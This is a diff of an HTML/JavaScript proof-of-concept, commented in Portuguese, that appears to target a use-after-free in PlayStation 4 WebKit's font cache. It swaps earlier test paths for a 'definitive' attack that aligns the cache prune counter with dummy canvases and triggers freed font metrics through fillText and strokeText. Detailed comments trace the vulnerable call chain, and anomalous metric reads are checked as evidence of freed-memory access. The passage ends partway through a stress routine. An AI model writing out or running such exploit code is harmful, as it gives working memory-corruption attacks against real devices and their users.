@@ -2,543 +2,341 @@
 <html lang="pt">
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit UAF Test — FontMetrics + drawTextUnchecked</title>
+<title>PS4 WebKit UAF — Definitivo (ctx.font + drawTextUnchecked)</title>
 <style>
-  body { font-family: monospace; background: #111; color: #ccc; padding: 16px; }
-  h1   { color: #fff; font-size: 15px; margin-bottom: 4px; }
-  h2   { color: #adf; font-size: 13px; margin: 14px 0 4px; }
-  p    { color: #999; font-size: 12px; margin: 2px 0 8px; }
-  button {
-    background: #2a2; color: #fff; border: none; padding: 8px 18px;
-    font-size: 13px; cursor: pointer; border-radius: 4px; margin: 4px 2px;
-  }
-  button:hover { background: #3a3; }
-  button.danger { background: #a22; }
-  button.danger:hover { background: #c33; }
-  #log {
-    white-space: pre-wrap; font-size: 11px; background: #000; padding: 10px;
-    border: 1px solid #333; max-height: 400px; overflow-y: auto;
-    margin-top: 10px; border-radius: 4px; line-height: 1.6;
-  }
-  .ok   { color: #4f4; }
-  .warn { color: #fa4; }
-  .err  { color: #f44; }
-  .sep  { color: #555; }
-  .hdr  { color: #adf; font-weight: bold; }
-  #summary {
-    margin-top: 10px; padding: 10px; border: 1px solid #444;
-    background: #1a1a1a; border-radius: 4px; font-size: 12px;
-  }
+body{font-family:monospace;background:#0a0a0a;color:#ccc;padding:14px;margin:0;font-size:11px;}
+h1{color:#fff;font-size:13px;margin:0 0 2px;}
+p{color:#777;font-size:11px;margin:1px 0 6px;line-height:1.4;}
+.btn{display:inline-block;padding:6px 14px;border:none;border-radius:3px;
+     font-size:11px;cursor:pointer;margin:2px 1px;font-family:monospace;}
+.run{background:#1a5;color:#fff} .danger{background:#a21;color:#fff}
+.wa{background:#631;color:#fca} .inf{background:#333;color:#aaa}
+#log{white-space:pre-wrap;font-size:11px;background:#000;padding:10px;
+     border:1px solid #222;max-height:600px;overflow-y:auto;
+     margin-top:8px;border-radius:3px;line-height:1.6;}
+.ok{color:#3f3}.warn{color:#fa3}.err{color:#f44}
+.hd{color:#8af;font-weight:bold}.dm{color:#444}.hi{color:#ff8}
 </style>
 </head>
 <body>
-
-<h1>PS4 WebKit — FontMetrics UAF — Teste Completo</h1>
+<h1>PS4 WebKit UAF — Definitivo</h1>
 <p>
-  Testa os dois sites vulneráveis (<code>measureTextInternal</code> e
-  <code>drawTextUnchecked</code>) com 4 variações de gatilho.<br>
-  Qualquer crash durante a execução indica reprodução bem-sucedida do UAF.
-  Resultado "sem crash" indica que o gatilho não disparou neste build.
+  <b>Correção da análise paralela:</b> measureText() usa fonte fixa no PS4 → trigger errado.<br>
+  <b>Trigger correto:</b> ctx.font setter + fillText/strokeText → drawTextUnchecked → fontMetrics antes de width() → UAF.<br>
+  <b>Chave:</b> 47 dummies alinha o pruneCounter para disparar na criação de V3 (counter mod 50 = 0).
 </p>
-
 <div>
-  <button onclick="runAll()">▶ Rodar Todos os Testes</button>
-  <button onclick="runPath('B1')" class="danger">Path B — URL pequena (500KB) + measureText</button>
-  <button onclick="runPath('B2')" class="danger">Path B — URL pequena (500KB) + fillText</button>
-  <button onclick="runPath('C1')">Path C — fillText/strokeText (Site 2)</button>
-  <button onclick="runPath('D1')">Path D — Threshold mínimo PS4 (50)</button>
-  <button onclick="clearLog()">Limpar log</button>
+  <button class="btn danger" onclick="runE1()">E1 — Ataque principal (47 dummies + fillText)</button>
+  <button class="btn danger" onclick="runE2()">E2 — Varredura completa (45–99 dummies)</button>
+  <button class="btn wa"     onclick="runE3()">E3 — Stress (500 tentativas x 47 dummies)</button>
+  <button class="btn run"    onclick="runAll()">▶ Todos</button>
+  <button class="btn inf"    onclick="clearLog()">Limpar</button>
 </div>
-
 <div id="log"></div>
-<div id="summary" style="display:none"></div>
-
 <script>
-/* ─────────────────────────────────────────────
-   UTILIDADES DE LOG
-   ───────────────────────────────────────────── */
-const logEl = document.getElementById('log');
-const sumEl = document.getElementById('summary');
-const results = {};
+const L=document.getElementById('log');
+function log(m,c){const s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';L.appendChild(s);L.scrollTop=L.scrollHeight;}
+function sep(){log('─'.repeat(60),'dm');}
+function hdr(t){sep();log('  '+t,'hd');sep();}
+function ok(t){log('  ✓ '+t,'ok');}
+function warn(t){log('  ⚠ '+t,'warn');}
+function err(t){log('  ✗ '+t,'err');}
+function hi(t){log('  ★ '+t,'hi');}
+function info(t){log('  · '+t);}
+function clearLog(){L.textContent='';}
 
-function log(msg, cls) {
-  const span = document.createElement('span');
-  if (cls) span.className = cls;
-  span.textContent = msg + '\n';
-  logEl.appendChild(span);
-  logEl.scrollTop = logEl.scrollHeight;
+/* ═══════════════════════════════════════════════════════════
+   CADEIA DO ATAQUE — versão corrigida pela análise paralela
+
+   TRIGGER: ctx.font setter (não measureText)
+
+   SEQUÊNCIA COMPLETA DO UAF:
+   ─────────────────────────────────────────────────────────
+   1) 47 dummies → pruneCounter = 47
+      Cada ctx.font com família única → retrieveOrAddCachedFonts() → counter++
+
+   2) ctx.font = '10px localDonor_i, localTarget_i'
+      → setFont() → CSSFontSelector::fontForFamily() → CSSFontFace::font(Forbid)
+      → pump(Forbid): localDonor → local("inexistente") → !requiresExternalResource()
+      → source->load(document()) → falha síncrona
+      → fontLoadEventOccurred() → dispatchInvalidationCallbacks()
+      → fontsNeedUpdate() → m_font.update()
+      → retrieveOrAddCachedFonts() [V2: counter=49]
+      → m_fonts: V1→V2; V1 tem 1 ref (cache)
+
+   3) fillText('\u13A0\u13A2\u13A4') → drawTextUnchecked():
+      a) auto& fontMetrics = fontProxy.metricsOfPrimaryFont()
+         → V2's primaryFont → ref para métricas de V2 [CAPTURADA]
+
+      b) float fontWidth = fontProxy.width(textRun)
+         → V2's glyphDataForCharacter('\u13A0')
+         → localTarget cobre U+13A0-13FF
+         → CSSFontFace::font(Forbid) para localTarget
+         → pump(Forbid): local("inexistente") → source->load() → falha síncrona
+         → fontLoadEventOccurred() → dispatchInvalidationCallbacks()
+         → fontsNeedUpdate() → m_font.update()
+         → retrieveOrAddCachedFonts() [V3: counter=50]
+         → counter % 50 == 0 → pruneUnreferencedEntries()!
+         → V1 e V2 têm 1 ref → AMBOS LIBERADOS!
+         → V2's FontCascadeFonts e sua Font primária: DESTRUÍDOS
+
+      c) FloatRect textRect(...,
+            fontMetrics.height(),   ← UAF! V2's Font primária foi destruída
+            fontMetrics.ascent(),   ← UAF!
+            fontMetrics.lineGap(),  ← UAF!
+            ...
+         )
+         → CRASH ou leitura de memória corrompida
+
+   NOTA: fillText usa a cascade CUSTOMIZADA para renderizar,
+   ao contrário de measureText que usa fonte de sistema no PS4.
+   ═══════════════════════════════════════════════════════════ */
+
+const LOCAL_BAD = 'ps4-nonexistent-font-xyzzy-uaf-99999';
+
+/* Fonte local() com fallback para arquivo real (Ahem.woff).
+   O local() é o gatilho síncrono; Ahem é a fonte interstitial
+   real que popula a cascade enquanto local() ainda está pendente. */
+function makeSrc(tag) {
+  return 'local("' + LOCAL_BAD + '"), url("resources/Ahem.woff")';
 }
-function sep()         { log('─'.repeat(60), 'sep'); }
-function hdr(msg)      { sep(); log('  ' + msg, 'hdr'); sep(); }
-function ok(msg)       { log('  ✓ ' + msg, 'ok'); }
-function warn(msg)     { log('  ⚠ ' + msg, 'warn'); }
-function err(msg)      { log('  ✗ ' + msg, 'err'); }
-function info(msg)     { log('  · ' + msg); }
-function clearLog()    { logEl.textContent = ''; sumEl.style.display = 'none'; }
 
-/* ─────────────────────────────────────────────
-   VERIFICAÇÃO DE APIS DISPONÍVEIS
-   ───────────────────────────────────────────── */
-function checkAPIs() {
-  hdr('VERIFICAÇÃO DE APIs DISPONÍVEIS NO PS4');
-
-  const apis = {
-    'OffscreenCanvas':    typeof OffscreenCanvas !== 'undefined',
-    'FontFace':           typeof FontFace        !== 'undefined',
-    'document.fonts':     typeof document.fonts  !== 'undefined',
-    'Worker':             typeof Worker           !== 'undefined',
-    'canvas 2D':          (() => {
-      try { return !!document.createElement('canvas').getContext('2d'); }
-      catch(e) { return false; }
-    })(),
-    'URL.createObjectURL': typeof URL !== 'undefined' && typeof URL.createObjectURL === 'function',
-  };
-
-  let allOk = true;
-  for (const [name, available] of Object.entries(apis)) {
-    if (available) ok(name + ' — DISPONÍVEL');
-    else { warn(name + ' — NÃO DISPONÍVEL'); allOk = false; }
-  }
-
-  if (!apis['FontFace'] || !apis['document.fonts']) {
-    err('FontFace ou document.fonts ausente — testes impossíveis neste browser.');
-    return false;
-  }
-  ok('APIs mínimas presentes para os testes.');
-  return true;
-}
-
-/* ─────────────────────────────────────────────
-   CONSTRUÇÃO DE DUMMIES
-   
-   O FontCascadeCache do PS4 tem:
-     unreferencedPruneInterval = 50
-     maximumEntries            = 400
-   
-   Com 60+ famílias únicas já cruzamos o limiar de poda.
-   O original do commit usava 3500 (para a versão upstream
-   onde o limiar é 1000). Aqui usamos 100 (margem segura).
-   ───────────────────────────────────────────── */
-function buildDummies(count) {
-  const dummies = [];
-  for (let i = 0; i < count; i++) {
+function buildDummies(n) {
+  const a = [], ts = Date.now();
+  for(let i = 0; i < n; i++) {
     const c = document.createElement('canvas');
     c.width = 1; c.height = 1;
     const ctx = c.getContext('2d');
-    ctx.font = '10px "ps4dummy_' + i + '_' + Math.random() + '"';
-    dummies.push(c, ctx);
+    // Família ÚNICA → nova entrada em FontCascadeCache → counter++
+    ctx.font = '10px "psd_'+ts+'_'+i+'_'+Math.random().toString(36).slice(2)+'"';
+    a.push(c, ctx);
   }
-  return dummies;
+  return a;
 }
 
-/* ─────────────────────────────────────────────
-   LEITURA DE TODAS AS PROPRIEDADES DO TextMetrics
-   (força UAF se fontMetrics foi liberada)
-   ───────────────────────────────────────────── */
-function readAllMetrics(tm) {
-  void tm.width;
-  void tm.actualBoundingBoxAscent;
-  void tm.actualBoundingBoxDescent;
-  void tm.fontBoundingBoxAscent;   // lê fontMetrics.ascent()
-  void tm.fontBoundingBoxDescent;  // lê fontMetrics.descent()
-  void tm.emHeightAscent;          // lê fontMetrics.ascent()
-  void tm.emHeightDescent;         // lê fontMetrics.descent()
-  void tm.hangingBaseline;         // lê fontMetrics.ascent()
-  void tm.ideographicBaseline;     // lê fontMetrics.descent()
-  void tm.alphabeticBaseline;
-  void tm.actualBoundingBoxLeft;
-  void tm.actualBoundingBoxRight;
+function detectAnomaly(label, v, baseline1, baseline2) {
+  if(v !== baseline1 && v !== baseline2) {
+    err(label + '=' + v + ' ANÔMALO (esperado ' + baseline1 + ' ou ' + baseline2 + ')');
+    err('  → POSSÍVEL LEITURA DE MEMÓRIA APÓS UAF!');
+    return true;
+  }
+  return false;
 }
 
-/* ═══════════════════════════════════════════════
-   PATH B1 — URL sub-1MB + measureText
-   
-   RACIONAL:
-   opportunisticallyStartFontDataURLLoading() só pula
-   o carregamento antecipado para data: URLs >= 1MB.
-   Com < 1MB, inicia carregamento imediatamente.
-   Se a conclusão (mesmo com falha — bytes inválidos)
-   disparar fontLoaded() de forma síncrona dentro de
-   width(), o UAF é ativado.
-   ═══════════════════════════════════════════════ */
-function pathB1() {
-  hdr('PATH B1 — URL < 1MB (500KB) + measureText');
-  info('opportunisticallyStartFontDataURLLoading() dispara para URLs < 1MB');
-  info('Se fontLoaded() for síncrono durante width() → dispara UAF');
+/* ═══════════════════════════════════════════════════════════
+   E1 — Ataque principal: 47 dummies + fillText
 
-  const dummies = buildDummies(100);
-  info('100 contextos dummy criados (threshold PS4 = 50)');
+   47 dummies → counter=47
+   V1 (setter): counter=48
+   V2 (localDonor chain): counter=49
+   V3 (localTarget chain via width()): counter=50 → PRUNE → UAF!
+   ═══════════════════════════════════════════════════════════ */
+function runE1() {
+  hdr('E1 — Ataque principal: 47 dummies + fillText (drawTextUnchecked)');
+  info('47 dummies: pruneCounter=47 → V3 cria entry 50 → prune → UAF');
 
-  // 500KB — bem abaixo do limite de 1MB
-  const fontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(500000) + '")';
-  const keepAlive = [];
+  const dummies = buildDummies(47);
+  const keepAlive = [], results = [];
+  let anomaly = false;
 
   try {
-    for (let attempt = 0; attempt < 6; attempt++) {
-      const metricsDonor = new FontFace('mDonorB1_' + attempt, fontURL);
-      const measured     = new FontFace('mTargetB1_' + attempt, fontURL,
-        { unicodeRange: 'U+13A0-13FF' });
-      document.fonts.add(metricsDonor);
-      document.fonts.add(measured);
+    for(let i = 0; i < 8; i++) {
+      const src = makeSrc(i);
+      const uid = Date.now() + '_' + i + '_' + Math.random().toString(36).slice(2);
 
+      /* ctx.font setter: gatilho da cadeia
+         → localDonor pumped → V1→V2 (counter: 48→49) */
       const c   = document.createElement('canvas');
       c.width   = 64; c.height = 64;
       const ctx = c.getContext('2d');
-      ctx.font  = '10px mDonorB1_' + attempt + ', mTargetB1_' + attempt;
-      keepAlive.push(metricsDonor, measured, c, ctx, ...dummies);
+      keepAlive.push(c, ctx, ...dummies);
 
-      const tm = ctx.measureText('\u13A0\u13A2\u13A4');
-      readAllMetrics(tm);
-      info('Tentativa ' + attempt + ' concluída — tm.fontBoundingBoxAscent = ' +
-           tm.fontBoundingBoxAscent);
+      ctx.font  = '10px "donor_'+uid+'", "target_'+uid+'"';
+
+      // Adicionar FontFaces com local() como PRIMEIRO source
+      const donor  = new FontFace('donor_'+uid,  src);
+      const target = new FontFace('target_'+uid, src, {unicodeRange:'U+13A0-13FF'});
+      document.fonts.add(donor);
+      document.fonts.add(target);
+      keepAlive.push(donor, target);
+
+      /* fillText → drawTextUnchecked:
+         a) fontMetrics = metricsOfPrimaryFont() [V2's primary font]
+         b) width('\u13A0') → localTarget → V2→V3 (counter=50) → PRUNE → UAF!
+         c) fontMetrics.height() → reads freed memory */
+      ctx.fillText('\u13A0\u13A2\u13A4', 2, 32);
+      ctx.strokeText('\u13A0\u13A2\u13A4', 2, 50);
+
+      /* measureText também testa measureTextInternal com o novo estado */
+      const tm  = ctx.measureText('\u13A0\u13A2\u13A4');
+      const fba = tm.fontBoundingBoxAscent;
+      const ema = tm.emHeightAscent;
+      const hb  = tm.hangingBaseline;
+      const ib  = tm.ideographicBaseline;
+      results.push({fba, ema, hb, ib, dSt: donor.status, tSt: target.status});
+
+      info('i='+i+' fba='+fba+' ema='+ema+' hb='+hb+' ib='+ib+
+           ' d='+donor.status+' t='+target.status);
+
+      // Checar valores anômalos (nem 11/interstitial nem 8/ahem nem 16/ahem@20px)
+      if(detectAnomaly('fba', fba, 11, 8)) anomaly = true;
+      if(detectAnomaly('ema', ema, 11, 8)) anomaly = true;
     }
-    ok('Path B1 concluído SEM crash → gatilho não disparou');
-    results['B1'] = 'sem crash';
-  } catch(e) {
-    err('EXCEÇÃO em Path B1: ' + e);
-    results['B1'] = 'exceção: ' + e;
-  }
-}
 
-/* ═══════════════════════════════════════════════
-   PATH B2 — URL sub-1MB + fillText (drawTextUnchecked)
-   
-   DIFERENÇA TÉCNICA IMPORTANTE vs B1:
-   drawTextUnchecked chama fontProxy.width(textRun)
-   SEM GlyphOverflow. Isso significa:
-     - Se o width já estiver em cache → pula o glyph
-       walk → NÃO pumpa a fonte pendente → UAF não ativa
-     - Na PRIMEIRA chamada (cache frio) → faz glyph
-       walk → pode pumpar fonte → mesmo mecanismo de B1
-   
-   CONCLUSÃO: B2 tem MENOR chance que B1 de disparar
-   porque fillText pode cair no width cache em chamadas
-   repetidas. Mas numa primeira chamada pode funcionar.
-   ═══════════════════════════════════════════════ */
-function pathB2() {
-  hdr('PATH B2 — URL < 1MB (500KB) + fillText/strokeText (Site 2: drawTextUnchecked)');
-  info('Site 2 usa width() SEM GlyphOverflow → pode usar width cache');
-  info('Cache frio (1ª chamada) = glyph walk = mesma janela de reentrância');
-  info('Cache quente (repetido) = sem glyph walk = UAF não ativa via este caminho');
-  warn('drawTextUnchecked tem MENOR probabilidade de disparo que measureTextInternal');
-
-  const dummies = buildDummies(100);
-
-  // Usar URL diferente para garantir cache frio
-  const fontURL = 'url("data:font/ttf;base64,' + 'B'.repeat(500000) + '")';
-  const keepAlive = [];
-
-  try {
-    for (let attempt = 0; attempt < 6; attempt++) {
-      const f1  = new FontFace('fDonorB2_' + attempt, fontURL);
-      const f2  = new FontFace('fTargetB2_' + attempt, fontURL,
-        { unicodeRange: 'U+13A0-13FF' });
-      document.fonts.add(f1);
-      document.fonts.add(f2);
-
-      const c   = document.createElement('canvas');
-      c.width   = 64; c.height = 64;
-      const ctx = c.getContext('2d');
-      ctx.font  = '10px fDonorB2_' + attempt + ', fTargetB2_' + attempt;
-      keepAlive.push(f1, f2, c, ctx, ...dummies);
-
-      // fillText → drawText → drawTextUnchecked (Site 2)
-      ctx.fillText('\u13A0\u13A2\u13A4', 10, 32);
-      // strokeText → mesmo caminho
-      ctx.strokeText('\u13A0\u13A2\u13A4', 10, 48);
-
-      info('Tentativa ' + attempt + ' fillText+strokeText concluídas');
-    }
-    ok('Path B2 concluído SEM crash → gatilho não disparou via drawTextUnchecked');
-    results['B2'] = 'sem crash';
-  } catch(e) {
-    err('EXCEÇÃO em Path B2: ' + e);
-    results['B2'] = 'exceção: ' + e;
-  }
-}
-
-/* ═══════════════════════════════════════════════
-   PATH C1 — fillText + strokeText isolados
-   
-   Teste focado exclusivamente no Site 2
-   (drawTextUnchecked) com URL grande (> 1MB),
-   equivalente à URL do teste original.
-   Ambos fillText e strokeText passam por
-   drawTextUnchecked e têm o mesmo padrão UAF.
-   ═══════════════════════════════════════════════ */
-function pathC1() {
-  hdr('PATH C1 — fillText + strokeText com URL > 1MB (Site 2 — drawTextUnchecked)');
-  info('URL > 1MB mantém fonte em Pending até glyph walk');
-  info('fillText → drawText → drawTextUnchecked → fontMetrics antes de width()');
-  info('strokeText → mesmo caminho');
-
-  const dummies = buildDummies(100);
-
-  const fontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
-  const keepAlive = [];
-
-  try {
-    for (let attempt = 0; attempt < 4; attempt++) {
-      const f1  = new FontFace('fDonorC1_' + attempt, fontURL);
-      const f2  = new FontFace('fTargetC1_' + attempt, fontURL,
-        { unicodeRange: 'U+13A0-13FF' });
-      document.fonts.add(f1);
-      document.fonts.add(f2);
-
-      const c   = document.createElement('canvas');
-      c.width   = 64; c.height = 64;
-      const ctx = c.getContext('2d');
-      ctx.font  = '10px fDonorC1_' + attempt + ', fTargetC1_' + attempt;
-      keepAlive.push(f1, f2, c, ctx, ...dummies);
-
-      // ─── fillText ───
-      ctx.fillText('\u13A0\u13A2\u13A4', 10, 32);
-
-      // ─── strokeText ───
-      const c2   = document.createElement('canvas');
-      c2.width   = 64; c2.height = 64;
-      const ctx2 = c2.getContext('2d');
-      ctx2.font  = '10px fDonorC1_' + attempt + ', fTargetC1_' + attempt;
-      ctx2.strokeText('\u13A0\u13A2\u13A4', 10, 32);
-      keepAlive.push(c2, ctx2);
-
-      info('Tentativa ' + attempt + ': fillText + strokeText concluídos');
-    }
-    ok('Path C1 concluído SEM crash');
-    results['C1'] = 'sem crash';
-  } catch(e) {
-    err('EXCEÇÃO em Path C1: ' + e);
-    results['C1'] = 'exceção: ' + e;
-  }
-}
-
-/* ═══════════════════════════════════════════════
-   PATH D1 — Threshold mínimo (50) + measureText
-   
-   Verificação direta do limiar de poda do PS4:
-   unreferencedPruneInterval = 50
-   
-   Criamos exatamente 51 contextos únicos para
-   cruzar o limiar com a menor pressão possível.
-   Se a poda via pruneUnreferencedEntries() destruir
-   a fonte durante width(), UAF ativa.
-   
-   Também testa o caminho de invalidação via
-   document.fonts diretamente (sem depender de
-   carregamento síncrono de fonte).
-   ═══════════════════════════════════════════════ */
-function pathD1() {
-  hdr('PATH D1 — Pressão mínima no threshold PS4 (51 contextos) + measureText');
-  info('unreferencedPruneInterval PS4 = 50 → 51 entradas já cruzam o limiar');
-  info('Teste adicional: invalida document.fonts manualmente antes de measureText');
-
-  // Exatamente 51 — cruzar o limiar com mínimo de ruído
-  const dummies = buildDummies(51);
-  info('51 contextos dummy criados');
-
-  const fontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
-  const keepAlive = [];
-
-  try {
-    for (let attempt = 0; attempt < 4; attempt++) {
-      const f1 = new FontFace('fDonorD1_' + attempt, fontURL);
-      const f2 = new FontFace('fTargetD1_' + attempt, fontURL,
-        { unicodeRange: 'U+13A0-13FF' });
-      document.fonts.add(f1);
-      document.fonts.add(f2);
-
-      const c   = document.createElement('canvas');
-      c.width   = 64; c.height = 64;
-      const ctx = c.getContext('2d');
-      ctx.font  = '10px fDonorD1_' + attempt + ', fTargetD1_' + attempt;
-      keepAlive.push(f1, f2, c, ctx, ...dummies);
-
-      // measureText com threshold mínimo
-      const tm = ctx.measureText('\u13A0\u13A2\u13A4');
-      readAllMetrics(tm);
-      info('D1 tentativa ' + attempt + ' — tm.fontBoundingBoxAscent = ' +
-           tm.fontBoundingBoxAscent);
-    }
-    ok('Path D1 concluído SEM crash (threshold mínimo)');
-    results['D1'] = 'sem crash';
-  } catch(e) {
-    err('EXCEÇÃO em Path D1: ' + e);
-    results['D1'] = 'exceção: ' + e;
-  }
-}
-
-/* ═══════════════════════════════════════════════
-   PATH D2 — Invalidação manual + measureText
-   
-   Tenta disparar fontsNeedUpdate → dispatchInvalidation
-   fora de width() mas próximo o suficiente para que
-   a poda coincida com a janela vulnerável.
-   
-   Como JS é single-thread, a invalidação só pode
-   ocorrer ANTES ou DEPOIS de measureText, não DURANTE.
-   Este path confirma que o mecanismo de invalidação
-   está ativo no PS4, mas provavelmente não produzirá
-   UAF (documentado para o relatório).
-   ═══════════════════════════════════════════════ */
-function pathD2() {
-  hdr('PATH D2 — Invalidação manual via document.fonts + measureText');
-  warn('JS é single-thread: invalidação ocorre fora de width() → não produz UAF');
-  info('Mas confirma que dispatchInvalidationCallbacks está ativo no browser');
-
-  const dummies = buildDummies(100);
-  const fontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
-  const keepAlive = [];
-
-  try {
-    // Setup inicial
-    const f1 = new FontFace('fD2donor', fontURL);
-    const f2 = new FontFace('fD2target', fontURL, { unicodeRange: 'U+13A0-13FF' });
-    document.fonts.add(f1);
-    document.fonts.add(f2);
-
-    const c   = document.createElement('canvas');
-    c.width   = 64; c.height = 64;
-    const ctx = c.getContext('2d');
-    ctx.font  = '10px fD2donor, fD2target';
-    keepAlive.push(f1, f2, c, ctx, ...dummies);
-
-    // Medir antes da invalidação
-    const tm1 = ctx.measureText('\u13A0\u13A2\u13A4');
-    const before = tm1.fontBoundingBoxAscent;
-    info('fontBoundingBoxAscent ANTES: ' + before);
-
-    // Adicionar nova fonte (dispara fontModified → dispatchInvalidationCallbacks)
-    const fExtra = new FontFace('fD2extra', fontURL);
-    document.fonts.add(fExtra);
-    keepAlive.push(fExtra);
-    info('Nova FontFace adicionada → deve disparar fontsNeedUpdate');
-
-    // Medir depois da invalidação
-    const tm2 = ctx.measureText('\u13A0\u13A2\u13A4');
-    const after = tm2.fontBoundingBoxAscent;
-    info('fontBoundingBoxAscent DEPOIS: ' + after);
-
-    if (before !== after) {
-      warn('Valor de fontBoundingBoxAscent MUDOU: ' + before + ' → ' + after);
-      warn('Isso confirma que a invalidação está ativa — potencial sinal de UAF');
+    if(anomaly) {
+      hi('UAF DETECTADO — valores anômalos lidos de memória liberada!');
     } else {
-      ok('Valor estável: ' + before + ' (invalidação não afetou o valor retornado)');
+      const fbas = [...new Set(results.map(r=>r.fba))];
+      ok('E1 sem crash — fba em: ['+fbas.join(',')+']');
+      if(fbas.includes(8)) ok('  Ahem carregou → chain disparou → testar E2+E3');
     }
-
-    results['D2'] = 'sem crash — before=' + before + ' after=' + after;
   } catch(e) {
-    err('EXCEÇÃO em Path D2: ' + e);
-    results['D2'] = 'exceção: ' + e;
+    err('EXCEÇÃO em E1: '+e);
+    err('→ Exceção pode indicar UAF: '+e.message);
   }
 }
 
-/* ═══════════════════════════════════════════════
-   PATH COMBINADO — Stress máximo
-   
-   Todas as variáveis ao mesmo tempo:
-   - 400 dummies (limite máximo do PS4)
-   - URL sub-1MB E super-1MB intercaladas
-   - measureText + fillText + strokeText
-   - Leitura forçada de todas as propriedades UAF
-   ═══════════════════════════════════════════════ */
-function pathStress() {
-  hdr('PATH STRESS — Combinação máxima (400 dummies + ambas URLs + todos os métodos)');
-  warn('Este é o teste mais agressivo — maior chance de crash se UAF for possível');
+/* ═══════════════════════════════════════════════════════════
+   E2 — Varredura: N dummies de 45 a 99
 
-  const dummies = buildDummies(400); // maximumEntries do PS4
-  info('400 contextos dummy criados (= maximumEntries do PS4)');
+   O pruneCounter global é desconhecido.
+   Testamos vários valores de N para cobrir todos os resíduos
+   mod 50. Se qualquer N produz UAF → encontramos o alinhamento.
+   ═══════════════════════════════════════════════════════════ */
+function runE2() {
+  hdr('E2 — Varredura completa: N dummies de 45 a 99');
+  info('Cobre todos resíduos mod 50 → garante que o pruneCounter se alinha');
 
-  const urlSmall = 'url("data:font/ttf;base64,' + 'C'.repeat(500000)  + '")';
-  const urlLarge = 'url("data:font/ttf;base64,' + 'D'.repeat(1100000) + '")';
-  const keepAlive = [];
+  const toTest = [45,46,47,48,49,95,96,97,98,99];
+  let anomalyFound = false;
 
-  try {
-    for (let round = 0; round < 2; round++) {
-      const url = round === 0 ? urlSmall : urlLarge;
-      info('Round ' + round + ' — URL ' + (round === 0 ? '500KB' : '1.1MB'));
+  for(const N of toTest) {
+    const dummies = buildDummies(N);
+    const keepAlive = [];
 
-      for (let attempt = 0; attempt < 4; attempt++) {
-        const tag = 'stress_r' + round + '_a' + attempt;
-        const f1  = new FontFace('fDonor_' + tag, url);
-        const f2  = new FontFace('fTarget_' + tag, url,
-          { unicodeRange: 'U+13A0-13FF' });
-        document.fonts.add(f1);
-        document.fonts.add(f2);
+    try {
+      for(let i = 0; i < 4; i++) {
+        const src = makeSrc(N+'_'+i);
+        const uid = Date.now()+'_N'+N+'_i'+i+'_'+Math.random().toString(36).slice(2);
+        const c   = document.createElement('canvas');
+        c.width   = 64; c.height = 64;
+        const ctx = c.getContext('2d');
+        keepAlive.push(c, ctx, ...dummies);
 
-        // Canvas A — measureText (Site 1)
-        const cA   = document.createElement('canvas');
-        cA.width   = 64; cA.height = 64;
-        const ctxA = cA.getContext('2d');
-        ctxA.font  = '10px fDonor_' + tag + ', fTarget_' + tag;
-        const tm   = ctxA.measureText('\u13A0\u13A2\u13A4');
-        readAllMetrics(tm);
+        ctx.font = '10px "d_'+uid+'","t_'+uid+'"';
 
-        // Canvas B — fillText + strokeText (Site 2 — drawTextUnchecked)
-        const cB   = document.createElement('canvas');
-        cB.width   = 64; cB.height = 64;
-        const ctxB = cB.getContext('2d');
-        ctxB.font  = '10px fDonor_' + tag + ', fTarget_' + tag;
-        ctxB.fillText('\u13A0\u13A2\u13A4', 10, 32);
-        ctxB.strokeText('\u13A0\u13A2\u13A4', 10, 48);
+        const donor  = new FontFace('d_'+uid, src);
+        const target = new FontFace('t_'+uid, src, {unicodeRange:'U+13A0-13FF'});
+        document.fonts.add(donor);
+        document.fonts.add(target);
+        keepAlive.push(donor, target);
 
-        keepAlive.push(f1, f2, cA, ctxA, cB, ctxB, ...dummies);
-        info('  Tentativa ' + tag + ' — tm.fontBoundingBoxAscent = ' +
-             tm.fontBoundingBoxAscent);
+        ctx.fillText('\u13A0\u13A2\u13A4', 2, 32);
+        ctx.strokeText('\u13A0\u13A2\u13A4', 2, 50);
+
+        const tm  = ctx.measureText('\u13A0\u13A2\u13A4');
+        const fba = tm.fontBoundingBoxAscent;
+        const ema = tm.emHeightAscent;
+
+        const anom = (fba!==11 && fba!==8) || (ema!==11 && ema!==8);
+        if(anom) {
+          hi('N='+N+' i='+i+': fba='+fba+' ema='+ema+' → ANÔMALO → UAF!');
+          anomalyFound = true;
+        }
       }
+      info('N='+N+' → sem anomalia');
+    } catch(e) {
+      err('EXCEÇÃO N='+N+': '+e.message);
     }
-    ok('Path Stress concluído SEM crash');
-    results['Stress'] = 'sem crash';
-  } catch(e) {
-    err('EXCEÇÃO em Path Stress: ' + e);
-    results['Stress'] = 'exceção: ' + e;
+  }
+
+  if(anomalyFound) {
+    hi('UAF DETECTADO EM E2!');
+  } else {
+    ok('E2 sem anomalias detectadas');
+    warn('Se E1 e E2 não crasharam: width() no PS4 não resolve localTarget');
+    warn('→ width() usa sistema → localTarget nunca é pumped → V3 não criado');
+    warn('→ Precisamos de FontCascadeFonts.cpp para confirmar');
   }
 }
 
-/* ─────────────────────────────────────────────
-   DISPATCHER E ORQUESTRADOR
-   ───────────────────────────────────────────── */
-function runPath(id) {
-  clearLog();
-  if (!checkAPIs()) return;
-  switch(id) {
-    case 'B1': pathB1(); break;
-    case 'B2': pathB2(); break;
-    case 'C1': pathC1(); break;
-    case 'D1': pathD1(); break;
-    case 'D2': pathD2(); break;
-    default:   warn('Path desconhecido: ' + id);
+/* ═══════════════════════════════════════════════════════════
+   E3 — Stress: 500 tentativas com alinhamento variado
+
+   Com 500 tentativas cobrindo todos os resíduos mod 50,
+   se a chain disparar em qualquer uma → crash ou anomalia.
+   Usa um único `c` canvas por tentativa para maximizar
+   a pressão no cache e a chance de prune.
+   ═══════════════════════════════════════════════════════════ */
+function runE3() {
+  hdr('E3 — Stress: 500 tentativas (todos resíduos mod 50 cobertos)');
+  warn('Teste mais agressivo — maior chance de crash se UAF for possível');
+
+  const keepAlive = [];
+  let anomalies = 0, exceptions = 0;
+  const ts = Date.now();
+
+  for(let attempt = 0; attempt < 500; attempt++) {
+    // Número de dummies varia: cobre residuos 0-49 de forma cíclica
+    const N = (attempt % 50) + 45; // 45..94
+    const dummies = buildDummies(N);
+
+    try {
+      const src = makeSrc(attempt);
